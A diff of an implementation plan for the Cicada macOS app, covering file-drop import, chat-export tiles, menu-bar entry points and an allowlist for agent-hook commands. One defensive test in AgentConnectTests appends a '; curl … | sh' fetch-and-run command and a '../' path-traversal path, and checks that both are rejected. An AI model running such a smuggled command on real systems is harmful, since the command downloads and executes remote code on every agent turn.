         XCTAssertTrue(view.registeredDraggedTypes.isEmpty)
+        window.contentView = nil
     }
 }
 ```
+  Run it alone (`swift test --filter GraphDropTests`) once the rest compiles and BEFORE Step 7's
+  `registerForDraggedTypes` override: it must be red there (WebKit registers file types). If it is
+  green without the override, the harness is not exercising WebKit's registration — say so in the
+  task report rather than keep a vacuous test; the live check (§ Verification 5) is then the proof.
 
   Edits to existing tests: `TopBarControlsTests.testFeedIsTheOneCallSiteThatOptsBackIntoUpload`
   becomes
@@ -4898,9 +5036,22 @@ final class GraphDropTests: XCTestCase {
   (its class doc's last paragraph is rewritten to say the same); `ImportFamilyTests:24` →
   `XCTAssertEqual(ImportFamily.chatExports.members, [.claudeExport, .chatgptExport, .geminiExport])`,
   `:43` → the same three for `previewMarks` (each now has a `logoName`); `AddSourceTileTests:14` →
-  three lines `XCTAssertEqual(AddSourceTile.claudeExport.vendors, [.claude])` (and ChatGPT, Gemini),
-  `:24`'s set lists the three; `ImportCatalogTests:19, 81, 188` replace `.chatExport` with the three
-  cases (read each assertion — `:188` lists tiles with no `logoName`, so the three leave that list);
+  three lines `XCTAssertEqual(AddSourceTile.claudeExport.vendors, [.claude])` (and ChatGPT, Gemini;
+  the test's doc sentence "Chat exports go to `POST /conversations/upload`" becomes "Chat exports go
+  through the one intake, `POST /intake/sniff` then `/intake/import`"),
+  `:24`'s set lists the three; `ImportCatalogTests`: `:19`'s route list replaces `.chatExport`
+  with `.claudeExport, .chatgptExport, .geminiExport`; `:81`
+  (`testATileSpanningTwoChannelsIsConnectedWhenEitherIs`) no longer has a chat tile to use — no
+  chat tile spans two channels now — so it moves to Safari, the one tile that still does:
+  `AddSourceTile.tileState(.safari, channels: [channel("safari-bookmarks", connected: false),
+  channel("safari-tabs", connected: true, detail: "3 tabs")])` → `connected` true, detail
+  `"3 tabs"`; `:188` (tiles with no `logoName`) drops `.chatExport` — the three chat tiles now
+  wear real marks — and the test's doc comment loses "Chat export (two vendors)"; add the three to
+  `testTheEightBrandedPlatformsAllDeclareALogo`'s map (`.claudeExport: "claude-desktop"`,
+  `.chatgptExport: "chatgpt"`, `.geminiExport: "gemini"` — `OriginIconography.logoName(for:)` of
+  each export origin) and rename it `testTheBrandedPlatformsAllDeclareALogo`.
+  `ImportFamilyTests`' doc comment at `:49-53` ("`chatExports` is" the markless family) becomes
+  false — rewrite it to say no family is markless now;
   `WalkthroughTests`' URL table gains `"gemini": "https://takeout.google.com/"` and add:
 
 ```swift
@@ -5100,7 +5251,11 @@ final class IntakeRouter {
     /// `nonisolated`: read by the pure `expand` and `IntakePreview.aggregate`.
     nonisolated static let maxFiles = 512
     static let pollInterval: Duration = .seconds(1)
-    nonisolated static let exportExtensions: Set<String> = ["json", "html", "htm", "zip", "csv", "txt", "xml", "rss", "atom", "opml"]
+    /// Everything either parser reads: the chat side (`json`, `html`, `zip`) and
+    /// `media_ingestor.parse_upload`'s saved-content formats (design §5.1 names
+    /// `.plist` — Safari's exported `Bookmarks.plist`).
+    nonisolated static let exportExtensions: Set<String> = ["json", "html", "htm", "zip", "csv", "txt", "xml",
+                                                            "rss", "atom", "opml", "plist"]
 
     private(set) var phase: IntakePhase = .idle
     private(set) var host: IntakeHost = .overlay
@@ -5269,17 +5424,22 @@ final class IntakeRouter {
 
     /// Polls a background job until it reports done — whether or not the panel
     /// is visible (R-IA20). The count shown is only ever one the job reported.
+    /// The WHOLE loop is one tracked request: tracking each poll alone would drop
+    /// `Store.intakeInFlight` for the second between polls and make the Sleep
+    /// page's worm flicker in and out of `.reading`.
     private func follow(_ job: IntakeJobRef, gen: Int) async throws -> IntakeJobStatus {
-        var status = IntakeJobStatus(id: job.id, total: job.total)
-        while !status.done {
-            try await sleep(Self.pollInterval)
-            status = try await tracked { try await api.intakeJob(id: job.id) }
-            if gen == generation, isImporting {
-                phase = .importing(IntakeProgress(total: status.total, staged: status.staged))
+        try await tracked {
+            var status = IntakeJobStatus(id: job.id, total: job.total)
+            while !status.done {
+                try await self.sleep(Self.pollInterval)
+                status = try await self.api.intakeJob(id: job.id)
+                if gen == self.generation, self.isImporting {
+                    self.phase = .importing(IntakeProgress(total: status.total, staged: status.staged))
+                }
             }
+            if let error = status.error { throw IntakeRouterError.job(error) }
+            return status
         }
-        if let error = status.error { throw IntakeRouterError.job(error) }
-        return status
     }
 
     /// Part b's Welcome Start path: import dropped files without opening the
@@ -5510,7 +5670,7 @@ enum IntakeSummary {
     /// it (`SourceDisplayName`), so the two cannot disagree.
     static func sourcesName(origin: String?) -> String {
         let channel = ChatVendor.allCases.first { $0.origin == origin }?.channelId ?? "files"
-        return SourceDisplayName.of(SourceOverview(id: channel, label: "", kind: .import))
+        return SourceDisplayName.of(id: channel)   // Views/Sources/SourceDisplayName.swift:73
     }
 }
 ```
@@ -5676,6 +5836,17 @@ struct IntakePanel: View {
                 Text(Copy.intakeNoExportYet).font(CicadaTheme.headingFont).foregroundStyle(CicadaTheme.textPrimary)
                 ForEach(vendors) { VendorExportRow(vendor: $0, startsOpen: vendor != nil) }
             }
+            // The overlay's idle state needs its own way out for the keyboard and
+            // VoiceOver (design I9); in the `+` sheet the sheet's back control is it.
+            if origin.host == .overlay {
+                HStack {
+                    Spacer()
+                    Button(Copy.intakeCancel) { intake.dismiss() }
+                        .buttonStyle(.cicadaPlain)
+                        .foregroundStyle(CicadaTheme.textSecondary)
+                        .keyboardShortcut(.cancelAction)
+                }
+            }
         }
     }
 
@@ -5689,7 +5860,9 @@ struct IntakePanel: View {
                 .multilineTextAlignment(.center)
             Button(Copy.intakeChooseFile) { chooseFile() }
                 .buttonStyle(.bordered)
-                .keyboardShortcut(.defaultAction)
+                // Overlay only: in the `+` sheet a default action here would take
+                // Return away from the tile grid's own Enter-opens-tile (R10).
+                .keyboardShortcut(origin.host == .overlay ? KeyboardShortcut.defaultAction : nil)
         }
         .frame(maxWidth: .infinity)
         .padding(CicadaTheme.spacingLG)
@@ -5707,7 +5880,7 @@ struct IntakePanel: View {
 
     private func chooseFile() {
         let panel = NSOpenPanel()
-        panel.allowedContentTypes = [.zip, .json, .html, .folder, .commaSeparatedText, .plainText, .xml]
+        panel.allowedContentTypes = [.zip, .json, .html, .folder, .commaSeparatedText, .plainText, .xml, .propertyList]
         panel.allowsMultipleSelection = true
         panel.canChooseDirectories = true
         panel.message = Copy.intakeDropTitle
@@ -5775,7 +5948,10 @@ struct IntakePanel: View {
             ForEach(p.warnings, id: \.self) {
                 Text($0).font(CicadaTheme.captionFont).foregroundStyle(CicadaTheme.textTertiary)
             }
-            if !p.chatFiles.isEmpty { intoPicker }
+            // `/sources/upload` has no bank parameter, so a drop that mixes saved
+            // content in would split across memories behind the picker's back —
+            // offer Into only when everything in the drop can follow it.
+            if !p.chatFiles.isEmpty && p.savedFiles.isEmpty { intoPicker }
             if p.importCount == 0 {
                 Text(Copy.intakeNothingNewLine).font(CicadaTheme.captionFont).foregroundStyle(CicadaTheme.textSecondary)
             }
@@ -5925,7 +6101,9 @@ struct IntakeDoneCard: View {
     @State private var readingNow = false
     @State private var switchedTo: String?
     @State private var switching = false
-    @State private var check = 0
+    /// Flips once on appear: the one-shot ✓ (design I6) — scale 0.8 → 1 over
+    /// `CicadaMotion.success`, an instant cut under Reduce Motion.
+    @State private var landed = false
 
     private var inputs: HonestyInputs {
         HonestyInputs.from(schedule: sleepVM.schedule, response: engineVM.response,
@@ -5944,8 +6122,9 @@ struct IntakeDoneCard: View {
                 Image(systemName: "checkmark.circle.fill")
                     .font(CicadaTheme.font(size: 22))
                     .foregroundStyle(CicadaTheme.success)
-                    .symbolEffect(.bounce, value: check)
-                    .symbolEffectsRemoved(reduceMotion)
+                    .scaleEffect(landed ? 1 : 0.8)
+                    .animation(CicadaMotion.success(reduceMotion: reduceMotion), value: landed)
+                    .accessibilityHidden(true)
                 Text(IntakeSummary.headline(outcome)).font(CicadaTheme.titleFont)
                     .foregroundStyle(CicadaTheme.textPrimary).accessibilityAddTraits(.isHeader)
             }
@@ -5974,7 +6153,7 @@ struct IntakeDoneCard: View {
             }
         }
         .task {
-            check &+= 1
+            landed = true
             AccessibilityNotification.Announcement(IntakeSummary.headline(outcome)).post()
             await engineVM.load()
             await sleepVM.load()
@@ -6100,9 +6279,10 @@ final class CicadaAppDelegate: NSObject, NSApplicationDelegate {
 ```
     with a comment above the heredoc: `# Track I T5 (R-IA25): offered in Open With and as a Dock drop
     target, never the default opener (LSHandlerRank Alternate).`
-  - **The window** — `ContentView.swift`: add `@Environment(IntakeRouter.self) private var intake`
-    and `@State private var dropTargeted = false`; on the `NavigationSplitView` chain (after
-    `.navigationSplitViewStyle(.prominentDetail)`):
+  - **The window** — `ContentView.swift`: add `import UniformTypeIdentifiers` (`.fileURL` is a
+    `UTType`; every file in the app that drops files imports it explicitly), `@Environment(IntakeRouter.self)
+    private var intake` and `@State private var dropTargeted = false`; on the `NavigationSplitView`
+    chain (after `.navigationSplitViewStyle(.prominentDetail)`):
 
 ```swift
         // Track I T5 (R-IA24) — drop anywhere: one window-level target, the veil
@@ -6128,9 +6308,10 @@ final class ClickableWebView: WKWebView {
     override func registerForDraggedTypes(_ newTypes: [NSPasteboard.PasteboardType]) {}
 }
 ```
-  - **The menu bar** — `MenuBarManager.swift`: `private var onImportFile: (() -> Void)?`; `setup`
-    gains the `onImportFile: @escaping () -> Void` parameter (stored); in `rebuildMenu` between the
-    *Save clipboard URL* and *Open Cicada* items:
+  - **The menu bar** — `MenuBarManager.swift`: `private var onImportFile: (() -> Void)?` beside the
+    other three (`:40-42`); `setup` gains `onImportFile: @escaping () -> Void` as its LAST parameter
+    (stored in the body with the others; `CicadaApp.swift:162` is its only caller and passes it
+    last); in `rebuildMenu` between the *Save clipboard URL* and *Open Cicada* items:
 
 ```swift
         // Track I T5 (R-IA26): the one intake from the menu bar; the status
@@ -6140,8 +6321,10 @@ final class ClickableWebView: WKWebView {
         menu.addItem(importItem)
 ```
     and `@objc private func importFileAction() { onImportFile?() }` beside the other actions.
-  - **Empty states** — `EmptyStateView.swift` gains `var onDropFiles: (([URL]) -> Void)? = nil`
-    and `@State private var dropTargeted = false`; inside the card, after the action block:
+  - **Empty states** — `EmptyStateView.swift` gains `import UniformTypeIdentifiers`,
+    `var onDropFiles: (([URL]) -> Void)? = nil` (after `settingsSection`, so every existing call
+    site compiles unchanged) and `@State private var dropTargeted = false`; inside the card, after
+    the action block:
 
 ```swift
                 if onDropFiles != nil {
@@ -6179,8 +6362,8 @@ private struct EmptyStateDrop: ViewModifier {
     `onDropFiles: { intake.accept(urls: $0, from: .emptyState(.feed)) }` / `(.sources)` with their own
     `@Environment(IntakeRouter.self) private var intake`.
   - **`Sync/Store.swift:81-89`** — the `intakeInFlight` doc becomes: "G125 R2 / Track I T5 — true
-    while the `IntakeRouter` has a sniff, an import or a job poll in flight (its request counter owns
-    this flag; no view writes it). The Sleep page's mood reads it to force `.reading`… Never persisted."
+    while the `IntakeRouter` has a sniff, an import or a background job in flight (its request
+    counter owns this flag; no view writes it). The Sleep page's mood reads it to force `.reading`… Never persisted."
 
 - [ ] **Step 8: Retire the overlay and the Upload button (R-IA22).**
   - `git rm app/CicadaApp/Sources/CicadaApp/Views/Common/UploadOverlay.swift` (with it go
@@ -6202,7 +6385,9 @@ private struct EmptyStateDrop: ViewModifier {
     var showsUpload: Bool = false
 ```
   - `APIClient.swift`: delete `uploadFile(fileURL:)` and `importToBank(name:fileURL:)` once
-    `grep -rn "uploadFile(\|importToBank(" app/CicadaApp/Sources` is empty; keep `BankImportResponse`
+    `grep -rn "uploadFile(\|importToBank(" app/CicadaApp/Sources | grep -v "func "` is empty (today
+    its only callers are `UploadOverlay.swift` and `AddSourceSheet.pickChatExport` — so do this
+    bullet after Step 9 deletes `pickChatExport`); keep `BankImportResponse`
     (its decode test documents the shim's shape for external callers).
 
 - [ ] **Step 9: Three chat tiles and a Gemini walkthrough (R-IA21).**
@@ -6230,10 +6415,16 @@ private struct EmptyStateDrop: ViewModifier {
             "Drop the .zip here, just as it arrived.",
         ]
 ```
-    `Theme/Copy.swift`: `claudeStepPath` → `"Settings > Privacy > Export data > check your email >
-    download the .zip"` (unchanged), and add `static let geminiStepPath = "Takeout > Deselect all >
-    My Activity > Gemini Apps > Export > download the .zip"` with `case .gemini: return
-    geminiStepPath` in `exportStepPath`.
+    `claudeStepPath`/`chatgptStepPath` in `Theme/Copy.swift` already end "download the .zip" and
+    stay as they are. Add `static let geminiStepPath = "Takeout > Deselect all > My Activity >
+    Gemini Apps > Export > download the .zip"` to `Theme/Copy+Intake.swift` (R-IA19), and the one
+    line `Theme/Copy.swift` must take — `case .gemini: return geminiStepPath` in
+    `exportStepPath(_:)` (`:312-322`), whose `switch` is exhaustive.
+    (`WalkthroughTests.testEveryVendorHasThreeOrFourSteps`,
+    `testVideoNamesAreDistinctAndFilenameSafe` and
+    `CopyConstantsTests.testEveryExportStepPathIsRoutedThroughCopy` then cover Gemini unchanged;
+    there is no `gemini.mp4`, so its walkthrough shows the placeholder, as every unrecorded vendor
+    does.)
   - `AddSourceSheet.swift`: the first case line becomes
     `case claudeExport, chatgptExport, geminiExport, bookmarksFile, pasteLink, rssFeed, calendar`,
     plus
@@ -6249,13 +6440,23 @@ private struct EmptyStateDrop: ViewModifier {
         }
     }
 ```
-    and in each switch: `route` → the three join `.importFile`; `title` → `chatVendor!.title`
-    for the three (write `case .claudeExport, .chatgptExport, .geminiExport: chatVendor?.title ?? ""`);
-    `blurb` → `chatVendor?.walkthrough.summary ?? ""`; `icon` → `"bubble.left.and.bubble.right"`;
-    `channelIds` → `[chatVendor!.channelId]` (spelled out per case: `["chat-export:claude"]`, …);
-    `logoName` → `chatVendor.flatMap { OriginIconography.logoName(for: $0.origin) }` for the three
-    (they leave the `nil` list at `:171`); `vendors` → `[chatVendor!.walkthrough]` per case. In
-    `flow(for:)` (`:583-584`):
+    and in each switch, one arm for the three (no force-unwraps):
+    - `route` (`:41`): `.claudeExport, .chatgptExport, .geminiExport` join the `.importFile` arm;
+    - `title` (`:48`): `case .claudeExport: "Claude"`, `case .chatgptExport: "ChatGPT"`,
+      `case .geminiExport: "Gemini"`;
+    - `blurb` (`:69`): `case .claudeExport, .chatgptExport, .geminiExport: chatVendor?.walkthrough.summary ?? ""`;
+    - `icon` (`:90`): the three share `"bubble.left.and.bubble.right"`;
+    - `channelIds` (`:125`): `case .claudeExport: ["chat-export:claude"]`, `case .chatgptExport:
+      ["chat-export:chatgpt"]`, `case .geminiExport: ["chat-export:gemini"]` — one channel per
+      tile, so `forChannel` stays unambiguous; its doc's "Chat export owns **both** export
+      channels" paragraph becomes "each chat tile owns its vendor's one channel";
+    - `logoName` (`:159-175`): `case .claudeExport, .chatgptExport, .geminiExport:
+      chatVendor.flatMap { OriginIconography.logoName(for: $0.origin) }` (they leave the `nil` arm
+      at `:171`; the doc's "multi-vendor exports" clause goes);
+    - `vendors` (`:211`): `case .claudeExport: [.claude]`, `case .chatgptExport: [.chatgpt]`,
+      `case .geminiExport: [.gemini]`.
+
+    In `flow(for:)` (`:583-584`):
 
 ```swift
             case .claudeExport, .chatgptExport, .geminiExport:
@@ -6273,9 +6474,11 @@ private struct EmptyStateDrop: ViewModifier {
     date."; members → `[.claudeExport, .chatgptExport, .geminiExport]`; `routeLines` → Claude and
     ChatGPT `["The .zip, a folder, or conversations.json"]`, Gemini `["The Takeout .zip or
     MyActivity.html"]`.
-  - `Views/Settings/IntegrationsView.swift` and anything else `grep -rn "\.chatExport\b" Sources`
-    finds: point at the matching vendor tile (`AddSourceTile.forChannel` already resolves each
-    channel to its own tile).
+  - Then `grep -rn "chatExport\b" app/CicadaApp/Sources app/CicadaApp/Tests` must find nothing but
+    the `chatExports` family (verified at `c31fb00`: the only other hits are the switches above,
+    `ImportFamilies.swift:55, 97`, a comment in `FeedView.swift:70` that Step 8 deletes, and the
+    tests Step 2 edits). `IntegrationsView` has no `.chatExport` reference — its "Import in Feed →"
+    hand-off resolves through `AddSourceTile.forChannel`, which now lands on each vendor's tile.
 
 - [ ] **Step 10: Green.** `swift build`, `swift test` (0 failures; the lints —
   `MotionLiteralLintTests`, `FontLiteralLintTests`, `LiquidGlassLintTests`, `ThemeTokenTests`,
@@ -6387,17 +6590,35 @@ final class AgentConnectTests: XCTestCase {
         return AgentWiringStep(step: "mcp", display: argv.joined(separator: " "), argv: argv, touches: ["~/.claude.json"])
     }
 
-    private func hookStep(settings: String = "/Users/x/.claude/settings.json") -> AgentWiringStep {
+    /// install.sh's `hook_command`, spelled the way `agent_wiring.hook_command` spells it.
+    private func hookCommand(_ harness: String) -> String {
+        "\"\(python)\" \"\(root.path)/api/hooks/capture.py\" --harness \(harness)"
+    }
+
+    private func hookStep(settings: String = "/Users/x/.claude/settings.json", harness: String = "claude-code",
+                          command: String? = nil) -> AgentWiringStep {
         let argv = [python, root.path + "/api/hooks/registry.py", "install", "--settings", settings, "--event", "Stop",
-                    "--command", "\"\(python)\" \"\(root.path)/api/hooks/capture.py\" --harness claude-code"]
+                    "--command", command ?? hookCommand(harness)]
         return AgentWiringStep(step: "hook", display: argv.joined(separator: " "), argv: argv, touches: ["~/.claude/settings.json"])
     }
 
     func testTheTwoInstallShShapesAreAllowed() {
         XCTAssertTrue(AgentConnectPolicy.isAllowed(mcpStep().argv, installRoot: root, binaries: [claude]))
         XCTAssertTrue(AgentConnectPolicy.isAllowed(hookStep().argv, installRoot: root, binaries: [claude]))
-        XCTAssertTrue(AgentConnectPolicy.isAllowed(hookStep(settings: "/Users/x/.codex/hooks.json").argv,
+        XCTAssertTrue(AgentConnectPolicy.isAllowed(hookStep(settings: "/Users/x/.codex/hooks.json", harness: "codex").argv,
                                                    installRoot: root, binaries: [claude]))
+    }
+
+    /// The hook command runs on every agent turn: it must be install.sh's
+    /// `hook_command` exactly, for the harness its settings file belongs to.
+    func testTheHookCommandMustBeInstallShsExactly() {
+        let smuggled = hookCommand("claude-code") + "; curl https://example.com/x | sh"
+        XCTAssertFalse(AgentConnectPolicy.isAllowed(hookStep(command: smuggled).argv, installRoot: root, binaries: [claude]))
+        XCTAssertFalse(AgentConnectPolicy.isAllowed(hookStep(settings: "/Users/x/.codex/hooks.json", harness: "claude-code").argv,
+                                                    installRoot: root, binaries: [claude]),
+                       "a Codex settings file takes the codex hook, never Claude Code's")
+        XCTAssertFalse(AgentConnectPolicy.isAllowed(hookStep(settings: "/Users/x/../../etc/.claude/settings.json").argv,
+                                                    installRoot: root, binaries: [claude]))
     }
 
     func testAnythingElseIsRefused() {
@@ -6498,6 +6719,15 @@ final class LocalInventoryTests: XCTestCase {
         XCTAssertEqual(byId[.agent("claude-desktop")], .alreadyOn)
         XCTAssertEqual(byId[.browser("chrome-bookmarks")], .alreadyOn)
         XCTAssertEqual(byId[.browser("safari-bookmarks")], .needsPermission)
+    }
+
+    /// `recall: unknown` (a probe past its 2 s) with nothing to run is a sentence
+    /// and a Retry, never a spinner that cannot end.
+    func testATimedOutProbeSaysSoInsteadOfSpinning() {
+        let items = LocalInventory.items(from: InventorySnapshot(
+            wiring: wiring([agent("codex", recall: "unknown", autosave: "on", steps: 0)]),
+            installedBundles: [], browsers: [:], claudeDesktopHasCicada: nil))
+        XCTAssertEqual(items.first?.readiness, .failed(Copy.foundCouldNotCheck))
     }
 
     func testNoWiringYetMeansNoAgentRowsNotFalseOnes() {
@@ -6612,14 +6842,9 @@ struct LiveAgentProcessRunner: AgentProcessRunning {
             process.standardError = errors
             process.standardOutput = FileHandle.nullDevice
             process.standardInput = FileHandle.nullDevice
-            let lock = NSLock()
-            var resumed = false
-            func finish(_ result: AgentProcessResult) {
-                lock.lock(); defer { lock.unlock() }
-                guard !resumed else { return }
-                resumed = true
-                continuation.resume(returning: result)
-            }
+            // The termination handler and the timeout race; the first one wins.
+            let once = ResumeOnce(continuation)
+            let finish: @Sendable (AgentProcessResult) -> Void = { once.resume($0) }
             process.terminationHandler = { done in
                 let data = errors.fileHandleForReading.readDataToEndOfFile()
                 finish(AgentProcessResult(status: done.terminationStatus, stderr: String(decoding: data, as: UTF8.self)))
@@ -6641,6 +6866,24 @@ struct LiveAgentProcessRunner: AgentProcessRunning {
     }
 }
 
+/// Resumes a continuation exactly once. A lock-guarded box rather than a
+/// captured `var`, so the two racing callbacks stay clean under Swift 6's
+/// Sendable checking (a local `func` mutating a captured flag is an error there).
+private final class ResumeOnce: @unchecked Sendable {
+    private let lock = NSLock()
+    private var continuation: CheckedContinuation<AgentProcessResult, Never>?
+
+    init(_ continuation: CheckedContinuation<AgentProcessResult, Never>) { self.continuation = continuation }
+
+    func resume(_ result: AgentProcessResult) {
+        lock.lock()
+        let pending = continuation
+        continuation = nil
+        lock.unlock()
+        pending?.resume(returning: result)
+    }
+}
+
 enum AgentConnectOutcome: Equatable {
     case done
     /// Not run at all; these are the commands to copy (D-1's fallback).
@@ -6654,6 +6897,13 @@ enum AgentConnectOutcome: Equatable {
 /// cannot vouch for — another checkout, another verb, one extra token — runs
 /// nothing.
 enum AgentConnectPolicy {
+    /// Each harness's Stop-hook settings file and the harness id install.sh's
+    /// `hook_command` names for it (`install.sh:312, 318`).
+    static let hookHarnesses: [(settingsSuffix: String, harness: String)] = [
+        ("/.claude/settings.json", "claude-code"),
+        ("/.codex/hooks.json", "codex"),
+    ]
+
     static func isAllowed(_ argv: [String], installRoot: URL, binaries: Set<String>) -> Bool {
         let root = installRoot.standardizedFileURL.path
         let python = root + "/api/.venv/bin/python"
@@ -6665,10 +6915,13 @@ enum AgentConnectPolicy {
             return argv[4..<dashes].allSatisfy { ["--scope", "user", "--env"].contains($0) || $0.hasPrefix("CICADA_MEMORY_PATH=") }
         }
         guard argv.count == 9, head == python, argv[1] == root + "/api/hooks/registry.py", argv[2] == "install",
-              argv[3] == "--settings",
-              argv[4].hasSuffix("/.claude/settings.json") || argv[4].hasSuffix("/.codex/hooks.json"),
+              argv[3] == "--settings", !argv[4].contains("/../"),
+              let harness = hookHarnesses.first(where: { argv[4].hasSuffix($0.settingsSuffix) })?.harness,
               Array(argv[5...6]) == ["--event", "Stop"], argv[7] == "--command" else { return false }
-        return argv[8].contains("api/hooks/capture.py") && argv[8].contains("--harness ")
+        // The command runs on every agent turn, so it is install.sh's
+        // `hook_command` byte for byte — a substring check would let an
+        // appended `; curl … | sh` through.
+        return argv[8] == "\"\(python)\" \"\(root)/api/hooks/capture.py\" --harness \(harness)"
     }
 }
 
@@ -6758,11 +7011,13 @@ final class LocalInventory {
     func refresh() async {
         isChecking = true
         let fetched = await probes.wiring()
+        let installed = Set([Self.cursorBundleId, Self.claudeDesktopBundleId].filter(probes.isInstalled))
         let snapshot = InventorySnapshot(
             wiring: fetched,
-            installedBundles: Set([Self.cursorBundleId, Self.claudeDesktopBundleId].filter(probes.isInstalled)),
+            installedBundles: installed,
             browsers: Dictionary(uniqueKeysWithValues: BrowserWatchPolicy.watched.map { ($0.channel, probes.browserPresence($0.channel)) }),
-            claudeDesktopHasCicada: probes.claudeDesktopHasCicada())
+            // R-IA29: Claude Desktop's config is read only when the app is here.
+            claudeDesktopHasCicada: installed.contains(Self.claudeDesktopBundleId) ? probes.claudeDesktopHasCicada() : nil)
         wiring = fetched
         items = FoundPolicy.order(Self.items(from: snapshot))
         isChecking = false
@@ -6775,7 +7030,11 @@ final class LocalInventory {
             let readiness: FoundItem.Readiness
             if a.recall == "on" && a.autosave == "on" { readiness = .alreadyOn }
             else if a.autosave == "invalid" { readiness = .failed(Copy.foundInvalidSettings) }
-            else { readiness = a.connect.isEmpty ? .checking : .ready }
+            // Nothing to run and not on: the probe timed out (`recall: unknown`,
+            // never offered an `mcp` step). A spinner here would never end — say
+            // so, and the row's Retry re-probes.
+            else if a.connect.isEmpty { readiness = .failed(Copy.foundCouldNotCheck) }
+            else { readiness = .ready }
             out.append(FoundItem(id: .agent(id), group: .agents, title: title, isPresent: true,
                                  content: .ownIntentionalAct, readiness: readiness, opensAnotherApp: false))
         }
@@ -6809,14 +7068,23 @@ final class LocalInventory {
             wiring: { try? await APIClient.shared.fetchAgentWiring() },
             isInstalled: { NSWorkspace.shared.urlForApplication(withBundleIdentifier: $0) != nil },
             browserPresence: { channel in
-                guard let file = BrowserWatchPolicy.file(for: channel),
-                      let url = file.candidatePaths.first(where: { FileManager.default.fileExists(atPath: $0.path) })
-                else { return .absent }
-                // TCC answers an open, not a permission bit: `isReadableFile` says
-                // yes to a Full-Disk-Access-protected file the app cannot read.
-                guard let handle = try? FileHandle(forReadingFrom: url) else { return .blocked }
-                try? handle.close()
-                return watcher.isEnabled(channel) ? .on : .off
+                guard let file = BrowserWatchPolicy.file(for: channel) else { return .absent }
+                // Open, never `fileExists` first: a stat TCC refuses answers "no
+                // such file" (`BrowserFileReader.readIfPresent`'s L2 note), which
+                // would turn a blocked Safari into an absent one and hide its
+                // Allow… row; `isReadableFile` says yes to a Full-Disk-Access file
+                // the app cannot read. Only the errno of an open tells the three
+                // apart. Nothing is read — the descriptor closes at once.
+                var blocked = false
+                for url in file.candidatePaths {
+                    let fd = open(url.path, O_RDONLY)
+                    if fd >= 0 {
+                        close(fd)
+                        return watcher.isEnabled(channel) ? .on : .off
+                    }
+                    if errno != ENOENT && errno != ENOTDIR { blocked = true }
+                }
+                return blocked ? .blocked : .absent
             },
             claudeDesktopHasCicada: {
                 let url = FileManager.default.homeDirectoryForCurrentUser
@@ -6850,8 +7118,14 @@ struct OnThisMacStrip: View {
         VStack(alignment: .leading, spacing: CicadaTheme.spacingXS) {
             Text(Copy.foundOnThisMac).font(CicadaTheme.headingFont).foregroundStyle(CicadaTheme.textPrimary)
             if let inventory {
-                if inventory.items.isEmpty {
-                    Text(inventory.isChecking ? Copy.foundCheckingApps : Copy.foundBackendDown)
+                // "Never blank", but never a false reason either: the backend line
+                // only when the probe really had no answer — an empty list with a
+                // wiring answer just means nothing here needs turning on.
+                if inventory.isChecking && inventory.items.isEmpty {
+                    Text(Copy.foundCheckingApps)
+                        .font(CicadaTheme.captionFont).foregroundStyle(CicadaTheme.textTertiary)
+                } else if !inventory.isChecking && inventory.wiring == nil {
+                    Text(Copy.foundBackendDown)
                         .font(CicadaTheme.captionFont).foregroundStyle(CicadaTheme.textTertiary)
                 }
                 ForEach(inventory.items) { item in row(item, wiring: inventory.wiring) }
@@ -7034,7 +7308,9 @@ Named so a reviewer does not read an absence as an oversight.
    switch), and stays open past 2 s. Drop it again into the same memory → "Nothing new". Drop the
    `chatgpt-export/` folder → skipped lines for `user.json`, `message_feedback.json`,
    `model_comparisons.json`, `shared_conversations.json` and `chat.html`, no error. Drop
-   `claude-50.json` → "Bringing in 50 conversations…" then "Bringing in 50 of 50" (the job path).
+   `claude-50.json` with Into → `intake-check` (Into resets to the active memory on every drop) →
+   "48 new · 0 grew since last time · 2 already here" (the zip already brought conversations 0
+   and 1), then "Bringing in 48 conversations…" and "Bringing in 48 of 48" (the job path).
 6. **Every entry point:** ⌘⇧I and File → Import… open the panel idle; the menu-bar worm's *Import a
    file…* opens it and brings the window forward; dragging `gemini-takeout.zip` onto the **Dock icon**
    opens the preview ("Gemini activity", prompts) in the existing window, never a second one; Finder
